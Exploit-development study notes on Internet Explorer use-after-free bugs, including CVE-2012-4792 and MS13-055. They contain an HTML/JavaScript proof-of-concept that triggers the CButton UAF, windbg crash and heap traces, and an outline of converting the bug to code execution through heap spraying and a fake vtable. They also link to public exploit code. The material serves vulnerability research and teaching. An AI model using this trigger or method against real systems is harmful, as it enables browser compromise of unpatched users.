# Windows Use-After-Frees
https://fuzzysecurity.com/tutorials/expDev/11.html
https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/
https://connormcgarr.github.io/browser1/

https://blog.csdn.net/qs_hud/article/details/9821735
https://rstforums.com/forum/topic/103900-rop-heap-spray-for-a-reverse-shell-in-ie8/
### Overview

Allocate space in heap when we create an Object. Object's virtual functions are organised and stored in a virtual table. When we delete/free the object in the heap and then proceed to "use" the object's function, this will lead to a memory access violation as the vtable has already been cleared during the free, which where the use-after-free vulnerability gets its name from. Using windbg and `!heap -p -a`, we can identify the location of the object in the heap and the amount of space it uses. We can then intentionally "use" this free space and fill it with an attacker controlled buffer, to convert the uaf into RCE. We can attempt to use a Precision Heap Spray and spray the lower sections of the heap with our shellcode which bypasses DEP, and as for our buffer, we can insert a fake virtual table filled with "0x0x0x0x"s which will allow us to pivot into our shellcode. We can alternatively use the [precise reallocation with HTML+TIME](https://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/) technique.

### Microsoft Internet Explorer - CButton Object Use-After-Free (CVE-2012-4792)

```
<!doctype html>
<html>
<head>
    <script>
    function helloWorld() {
        var e0 = null;
        var e1 = null;
        var e2 = null;

        try {
            e0 = document.getElementById("a");
            e1 = document.getElementById("b");
            e2 = document.createElement("q");
            e1.applyElement(e2);
            e1.appendChild(document.createElement('button'));
            e1.applyElement(e0);
            e2.outerText = "";
            e2.appendChild(document.createElement('body'));
        } catch(e) { }
        CollectGarbage();
        var eip = window;
        var data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        eip.location = unescape("AA" + data);
    }

    </script>
</head>
<body onload="eval(helloWorld())">
    <form id="a">
    </form>
    <dfn id="b">
    </dfn>
</body>
</html>

(a0.3c0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=05682fa8 ebx=04db8f28 ecx=00000052 edx=00000000 esi=00000000 edi=05682fa8
eip=3d08625c esp=0336d7a0 ebp=0336d80c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CMarkup::OnLoadStatusDone+0x4ef:
3d08625c 8b07            mov     eax,dword ptr [edi]  ds:0023:05682fa8=????????
1:022> !heap -p -a edi
    address 05682fa8 found in
    _DPH_HEAP_ROOT @ 151000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    5640eb0:          5682000             2000
    7c91a1ba ntdll!RtlFreeHeap+0x000000f9
    3d2b4b10 mshtml!CButton::`vector deleting destructor'+0x0000002f
    3cfa0ad9 mshtml!CBase::SubRelease+0x00000022
    3cf7e76d mshtml!CElement::PrivateRelease+0x00000029
    3cf7a976 mshtml!PlainRelease+0x00000025
    3cf9709c mshtml!PlainTrackerRelease+0x00000014
    3d7b5194 jscript!VAR::Clear+0x0000005c
    3d7b55b9 jscript!GcContext::Reclaim+0x000000ab
    3d7b4d08 jscript!GcContext::CollectCore+0x00000113
    3d82471d jscript!JsCollectGarbage+0x0000001d
    3d7c4aac jscript!NameTbl::InvokeInternal+0x00000137
    3d7c28c5 jscript!VAR::InvokeByDispID+0x0000017c
    3d7c4f93 jscript!CScriptRuntime::Run+0x00002abe
    3d7c13ab jscript!ScrFncObj::CallWithFrameOnStack+0x000000ff
    3d7c12e5 jscript!ScrFncObj::Call+0x0000008f
    3d7c1113 jscript!CSession::Execute+0x00000175


1:022> kv
ChildEBP RetAddr  Args to Child
0336d80c 3cee3e45 04f38fc0 04df06bc 04df06a8 mshtml!CMarkup::OnLoadStatusDone+0x4ef
0336d82c 3cee3e21 00000004 0336dcb4 00000001 mshtml!CMarkup::OnLoadStatus+0x47
0336dc78 3cf50aef 04f3af48 00000000 00000000 mshtml!CProgSink::DoUpdate+0x52f
0336dc8c 3cf8a7e9 04f3af48 04f3af48 04d9cd58 mshtml!CProgSink::OnMethodCall+0x12
0336dcc0 3cf75488 0336dd48 3cf753da 00000000 mshtml!GlobalWndOnMethodCall+0xfb
0336dce0 7e418734 0007025e 00000009 00000000 mshtml!GlobalWndProc+0x183
0336dd0c 7e418816 3cf753da 0007025e 00008002 USER32!InternalCallWinProc+0x28
0336dd74 7e4189cd 00000000 3cf753da 0007025e USER32!UserCallWinProcCheckWow+0x150 (FPO: [Non-Fpo])
0336ddd4 7e418a10 0336de08 00000000 0336feec USER32!DispatchMessageWorker+0x306 (FPO: [Non-Fpo])
0336dde4 3e2ec1d5 0336de08 00000000 01f9cf58 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])
0336feec 3e2932ee 030ecfe0 01000002 03070ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54c (FPO: [Non-Fpo])
0336ffa4 3e136f69 01f9cf58 0015476c 0336ffec IEFRAME!LCIETab_ThreadProc+0x2c1 (FPO: [Non-Fpo])
0336ffb4 7c80b729 03070ff0 01000002 0015476c iertutil!CIsoScope::RegisterThread+0xab (FPO: [Non-Fpo])
0336ffec 00000000 3e136f5b 03070ff0 00000000 kernel32!BaseThreadStart+0x37 (FPO: [Non-Fpo])
```

- Create CButton Object

- Free CButton Object

- `mshtml!CMarkup::OnLoadStatusDone+0x4ef` uses freed CButton Object triggering the UaF

- CElement::FindDefaultElem returns CButton element after it has been freed 

- Set breakpoint at `CMarkup::OnLoadStatusDone+0x4dc` since it comes after CElement::FindDefaultElem and we want to see the address of our CButton Object. Do not set it at `CElement::FindDefaultElem` itself as it is called multiple times

```
0:000> sxe ld:mshtml
0:000> g
ModLoad: 3cea0000 3d45e000   C:WINDOWSsystem32mshtml.dll
1:025> bp !mshtml + 0x414c27 ".printf "Created CButton at %p", eax;.echo;g"
1:025> bp !mshtml + 0x414ae1 ".printf "Deleting CButton at %p", ecx;.echo;g"
1:025> bp !mshtml + 0x44224
1:025> bl
 0 e 3d2b4c27     0001 (0001)  1:**** mshtml!CButton::CreateElement+0x16 ".printf "Created CButton at %p", eax;.echo;g"
 1 e 3d2b4ae1     0001 (0001)  1:**** mshtml!CButton::`vector deleting destructor' ".printf "Deleting CButton at %p", ecx;.echo;g"
 2 e 3cee4224     0001 (0001)  1:**** mshtml!CMarkup::OnLoadStatusDone+0x4dc
1:025> g
Created CButton at 055eefa8
Deleting CButton at 055eefa8
Breakpoint 2 hit
3cee4224 e80bc30100      call    mshtml!CElement::FindDefaultElem (3cf00534)
==== Step inside mshtml!CElement::FindDefaultElem ====
3cf00585 56              push    esi
3cf00586 8bc3            mov     eax,ebx
3cf00588 e84aa20400      call    mshtml!CElement::GetParentForm (3cf4a7d7)
3cf0058d 8bf0            mov     esi,eax
3cf0058f 3bf2            cmp     esi,edx
3cf00591 0f857e4d1a00    jne     mshtml!CElement::FindDefaultElem+0x57 (3d0a5315) [br=0]
3cf00597 395510          cmp     dword ptr [ebp+10h],edx ss:0023:0336d79c=00000000
3cf0059a 0f8569a71f00    jne     mshtml!CElement::FindDefaultElem+0x79 (3d0fad09) [br=0]
==== Step until mshtml!CElement::FindDefaultElem+0x96 ====
eax=00000000 ebx=052dafd0 ecx=00000052 edx=00000000 esi=00000000 edi=04c1a6a8
eip=3cf005a0 esp=0336d780 ebp=0336d78c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CElement::FindDefaultElem+0x96:
3cf005a0 8b87a8010000    mov     eax,dword ptr [edi+1A8h] ds:0023:04c1a850=055eefa8
1:025> dc 04c1a6a8 // this will be in the eax value
04c1a6a8  3cfa4f78 00000014 000000b8 00000000  xO.<............
04c1a6b8  00000000 3cf46c50 04c1a6a8 021e1b8c  ....Pl. 
dds 04c1a6a8 L1
04c1a6a8  3cfa4f78 // this should be the mshtml!CDoc::`vftable`
1:025> !heap -p -a 04c1a6a8
    address 04c1a6a8 found in
    _DPH_HEAP_ROOT @ 151000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 44cad98:          4c1a6a8              954 -          4c1a000             2000
    mshtml!CDoc::`vftable'
    7c919c0c ntdll!RtlAllocateHeap+0x00000e64
    3ceb29f0 mshtml!CDoc::operator new+0x00000013
    3cebd2e8 mshtml!CBaseCF::CreateInstance+0x0000007b
    3e284da3 IEFRAME!CBaseBrowser2::_OnCoCreateDocument+0x0000005f
    3e284d44 IEFRAME!CBaseBrowser2::_ExecExplorer+0x00000073
    3e2eca2e IEFRAME!CBaseBrowser2::Exec+0x0000012d
    3e2ecec8 IEFRAME!CShellBrowser2::_Exec_CCommonBrowser+0x00000080
    3e2ecef7 IEFRAME!CShellBrowser2::Exec+0x00000626
    3e284b53 IEFRAME!CDocObjectHost::_CoCreateHTMLDocument+0x0000004e
    3e284ae7 IEFRAME!CDocObjectHost::_CreatePendingDocObject+0x0000002c
    3e28320a IEFRAME!CDocObjectHost::CDOHBindStatusCallback::_ProcessCLASSIDBindStatus+0x000000c5
    3e283d17 IEFRAME!CDocObjectHost::CDOHBindStatusCallback::_ProcessSecurityBindStatus+0x000000b2
    3e282d1d IEFRAME!CDocObjectHost::CDOHBindStatusCallback::OnProgress+0x000000a5
    781362f7 urlmon!CBSCHolder::OnProgress+0x0000003c
    78136247 urlmon!CBinding::CallOnProgress+0x00000030
    7816180b urlmon!CBinding::InstantiateObject+0x000000b7
==== Step until the end of the function ====
1:025> p
3cf005a6 5e              pop     esi
3cf005a7 5f              pop     edi
3cf005a8 5b              pop     ebx
3cf005a9 5d              pop     ebp
3cf005aa c20c00          ret     0Ch
```

- CButton still being referenced by CDoc element

- Set breakpoint at end of `mshtml!CDoc::operator new`

- We see that 04c1a6a8 is returned into EAX

- Basically, there is a reference of the freed CButton in CDoc, after garbage is collectedã€‚ When the OnLoad function is completed,  OnLoadStatusDone() is called which uses the CButton reference.

- Find CButton size using `mshtml!CButton::CreateElement` (0x58) / or simply use `!heap -p -a REG` to see the size of the object whose vtable is being referenced for virtual functions

- PageHeap MUST be disabled during exploitation

References:

- https://github.com/WizardVan/CVE-2012-4792

- https://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/

- https://www.pkuexploit.com/files/paper48.pdf

- https://cloud.tencent.com/developer/article/1818289

- https://www.cnblogs.com/Lamboy/p/3879089.html

- https://msrc.microsoft.com/blog/2012/12/new-vulnerability-affecting-internet-explorer-8-users/

### Microsoft Internet Explorer - CAnchorElement Use-After-Free (MS13-055)

Vulnerability arises from `<q>` comes after a `<tr>`

- Must have a Table, then a TableRow, then a Div/Legend, then a Span, then a Phrase, then an Anchor, then a Table element

- Free the Phrase element, but the Anchor element is still somehow referenced, due to poor management of DOM tree as per [researcher's discovery slides](https://speakerd.s3.amazonaws.com/presentations/0df98910d26c0130e8927e81ab71b214/for-share.pdf)

References:

- https://connormcgarr.github.io/browser1/

### Microsoft Internet Explorer 8 - 'SetMouseCapture ' Use After Free (CVE-2013-3893)

- [Microsoft Internet Explorer 8 - 'SetMouseCapture ' Use After Free (CVE-2013-3893)](https://github.com/ricew4ng/BrowserSecurity/blob/master/CVE-2013-3893_IE_UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2013-3893_IE_UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md)

- [Metasploit PoC on exploitdb](https://www.exploit-db.com/exploits/49872)



### Microsoft Internet Explorer CGenericElement Object Use After Free (CVE-2013-1347)

- [Microsoft Internet Explorer CGenericElement Object Use After Free (CVE-2013-1347)](https://github.com/exp-sky/Blog/blob/master/CVE-2013-1347_Analysis/CVE-2013-1347_Analysis.md)

- [Metasploit PoC on exploitdb](https://www.exploit-db.com/exploits/25294)
